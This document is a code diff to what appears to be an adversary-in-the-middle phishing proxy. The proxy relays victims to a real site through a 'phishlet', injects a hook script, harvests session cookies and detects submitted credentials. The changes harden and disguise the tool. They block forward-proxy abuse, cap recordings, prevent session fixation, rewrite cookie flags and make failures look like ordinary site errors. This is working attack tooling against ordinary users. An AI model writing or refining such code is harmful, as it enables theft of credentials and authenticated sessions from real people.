@@ -23,7 +23,6 @@
 import http.cookiejar
 import http.server
 import json
-import os
 import re
 import secrets
 import socketserver
@@ -54,8 +53,9 @@ STRIP_REQUEST_HEADERS = {
     "sec-fetch-dest", "sec-fetch-user",
 }
 
+from . import classify
 from . import intel as intel_mod
-from .intel import INTEL_PATH, INTEL_JS_PATH
+from .intel import INTEL_JS_PATH, INTEL_PATH
 
 HOOK_PATH = "/__bh/hook.js"
 CAPTURE_PATH = "/__bh/capture"
@@ -226,9 +226,21 @@ class ProxyEngine:
 
     # ---- upstream ----
     def fetch(self, sess, method, path, headers=None, body=None):
-        """Request the real site with this victim's cookie jar."""
+        """Request the real site with this victim's cookie jar.
+
+        An absolute URL is only accepted when it points at OUR upstream. A
+        victim-supplied absolute-form request line (GET http://internal/…) used
+        to be fetched verbatim, which turned the proxy into an open forward
+        proxy: internal services, loopback and cloud metadata were reachable,
+        and the victim's session cookies were sent to the chosen host.
+        """
         import requests
-        url = path if path.startswith("http") else f"{self.phishlet.base_url}{path}"
+        if path.startswith("http"):
+            if not path.startswith(self.phishlet.base_url):
+                raise ValueError("refusing to fetch a foreign absolute URL")
+            url = path
+        else:
+            url = f"{self.phishlet.base_url}{path}"
         h = {k: v for k, v in (headers or {}).items()
              if k.lower() not in STRIP_REQUEST_HEADERS}
         h.setdefault("User-Agent", sess.ua)
@@ -244,7 +256,7 @@ class ProxyEngine:
         return resp
 
     # ---- rewriting ----
-    def rewrite_headers(self, resp):
+    def rewrite_headers(self, resp, over_tls=False):
         """Return a LIST of (name, value) pairs.
 
         Duplicates matter: an upstream page can set several cookies and we must
@@ -257,9 +269,12 @@ class ProxyEngine:
             if kl in STRIP_RESPONSE_HEADERS:
                 continue
             if kl == "set-cookie":
-                # keep the cookie usable on our host: drop Domain/Secure scoping
+                # keep the cookie usable on our host: Domain always goes, and
+                # Secure only when we are serving plain HTTP (keeping it over
+                # HTTPS preserves the upstream's transport guarantee)
                 v = re.sub(r";\s*Domain=[^;]+", "", v, flags=re.I)
-                v = re.sub(r";\s*Secure", "", v, flags=re.I)
+                if not over_tls:
+                    v = re.sub(r";\s*Secure", "", v, flags=re.I)
                 out.append((k, v))
                 continue
             if kl == "location":
@@ -355,7 +370,11 @@ class ProxyEngine:
         sess.captures += 1
         sess.fingerprint.update(fp)
         if events:
+            # total cap, not just a per-call slice: a client posting 500 events
+            # in a loop used to grow one session's recording without limit
             sess.recording.extend(events[:500])
+            if len(sess.recording) > 5000:
+                del sess.recording[:-5000]
         for name, value in (cookies or {}).items():
             if self.phishlet.wants_cookie(name):
                 sess.harvested.append({"name": name, "value": value,
@@ -381,16 +400,11 @@ class ProxyEngine:
         return {"ok": True, "cred": is_cred, "session": sess.sid}
 
     def _looks_like_credentials(self, fields):
-        keys = {k.lower() for k in fields}
-        ident = any(any(t in k for t in ("user", "login", "email", "mail", "phone",
-                                        "account", "identifier")) for k in keys)
-        secret = any(any(t in k for t in ("pass", "pwd", "pin", "otp", "code", "token"))
-                     for k in keys)
-        return ident and secret
+        # shared with the static server (core/classify.py)
+        return classify.is_credential_pair(fields)
 
     def _risk(self, fields, fp):
         s, reasons = 0, []
-        ua = (fp.get("ua") or "")
         if fp.get("webdriver"):
             s += 50
             reasons.append("navigator.webdriver set (automation)")
@@ -562,6 +576,14 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         pass
 
     # -- helpers --
+    def _session_cookie(self, sid):
+        """HttpOnly always (page script must not read the session id), Secure
+        whenever the victim's connection is HTTPS (direct TLS or tunnel edge)."""
+        c = f"__bhs={sid}; Path=/; SameSite=Lax; HttpOnly"
+        if self._over_tls():
+            c += "; Secure"
+        return c
+
     def _json(self, obj, status=200):
         body = json.dumps(obj).encode()
         self.send_response(status)
@@ -586,13 +608,14 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         sid = sid_hint
         if not sid:
             cookie = self.headers.get("Cookie") or ""
-            m = re.search(r"__bhs=([0-9a-f]+)", cookie)
+            m = re.search(r"__bhs=([0-9a-f]{16,64})", cookie)
             if m:
                 sid = m.group(1)
         if not sid:
             q = urllib.parse.urlparse(self.path).query
             cand = urllib.parse.parse_qs(q).get("s", [""])[0]
-            m2 = re.match(r"^([0-9a-f]{6,64})$", cand or "")
+            # 16+ hex chars (64+ bits) — a 6-char sid allowed session fixation
+            m2 = re.match(r"^([0-9a-f]{16,64})$", cand or "")
             if m2:
                 sid = m2.group(1)
         return self.engine.session(sid, ip=self._client_ip(),
@@ -618,7 +641,7 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
             self.send_header("Content-Type", "application/javascript")
             self.send_header("Cache-Control", "no-store")
             self.send_header("Content-Length", str(len(js)))
-            self.send_header("Set-Cookie", f"__bhs={sess.sid}; Path=/; SameSite=Lax")
+            self.send_header("Set-Cookie", self._session_cookie(sess.sid))
             self.end_headers()
             self.wfile.write(js)
             return
@@ -628,7 +651,7 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-Type", "application/javascript")
             self.send_header("Content-Length", str(len(js)))
-            self.send_header("Set-Cookie", f"__bhs={sess.sid}; Path=/; SameSite=Lax")
+            self.send_header("Set-Cookie", self._session_cookie(sess.sid))
             self.end_headers()
             self.wfile.write(js)
             return
@@ -670,7 +693,12 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
             if not any(payload.get(k) for k in ("fields", "fingerprint", "cookies", "events")):
                 self._json({"ok": False, "error": "empty payload"}, status=400)
                 return
-            sess = self._session(sid_hint=str(payload.get("sid") or "") or None)
+            hint = str(payload.get("sid") or "")
+            # only a well-formed id may be adopted; anything else is replaced by
+            # a fresh server-generated one (no fixation, no arbitrary keys)
+            if not re.match(r"^[0-9a-f]{16,64}$", hint):
+                hint = ""
+            sess = self._session(sid_hint=hint or None)
             res = self.engine.capture(sess, payload, ip=self._client_ip())
             self._json(res)
             return
@@ -680,14 +708,40 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         self._proxy("HEAD")
 
     # -- proxy core --
+    def _target_path(self):
+        """Path + query only. An absolute-form request line keeps its path and
+        loses the attacker's host, so the proxy can never be used as a forward
+        proxy to a third party or an internal address."""
+        p = self.path or "/"
+        if p[:7].lower() == "http://" or p[:8].lower() == "https://":
+            u = urllib.parse.urlsplit(p)
+            p = u.path or "/"
+            if u.query:
+                p += "?" + u.query
+        if not p.startswith("/"):
+            p = "/" + p
+        return p
+
+    def _over_tls(self):
+        """Did the victim reach us over HTTPS (direct TLS or a tunnel edge)?"""
+        if getattr(self.connection, "cipher", None):
+            return True
+        proto = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip()
+        return proto.lower() == "https"
+
     def _proxy(self, method):
         sess = self._session()
         n = int(self.headers.get("Content-Length") or 0)
+        if n < 0:
+            n = 0
+        if n > MAX_BODY:
+            self._json({"ok": False, "error": "payload too large"}, status=413)
+            return
         body = self.rfile.read(n) if n else None
         hdrs = {k: v for k, v in self.headers.items()}
         hdrs["Cookie"] = sess.cookie_header()          # upstream session, not the victim's
         try:
-            resp = self.engine.fetch(sess, method, self.path, headers=hdrs, body=body)
+            resp = self.engine.fetch(sess, method, self._target_path(), headers=hdrs, body=body)
         except Exception as e:
             # look like a real site hiccup, never like a proxy error
             msg = (b"<!doctype html><html><head><title>502</title></head><body>"
@@ -702,7 +756,7 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
             return
 
         ctype = resp.headers.get("Content-Type", "")
-        out_headers = self.engine.rewrite_headers(resp)
+        out_headers = self.engine.rewrite_headers(resp, over_tls=self._over_tls())
         if "text/html" in ctype:
             html = resp.text
             html = self.engine.rewrite_html(html, sess, urllib.parse.urlparse(self.path).path)
@@ -714,7 +768,7 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         out_headers = [(k, v) for k, v in out_headers if k.lower() != "content-length"]
         out_headers.append(("Content-Length", str(len(body_out))))
         # our own session cookie rides alongside whatever upstream set
-        out_headers.append(("Set-Cookie", f"__bhs={sess.sid}; Path=/; SameSite=Lax"))
+        out_headers.append(("Set-Cookie", self._session_cookie(sess.sid)))
 
         self.send_response(resp.status_code)
         for k, v in out_headers:
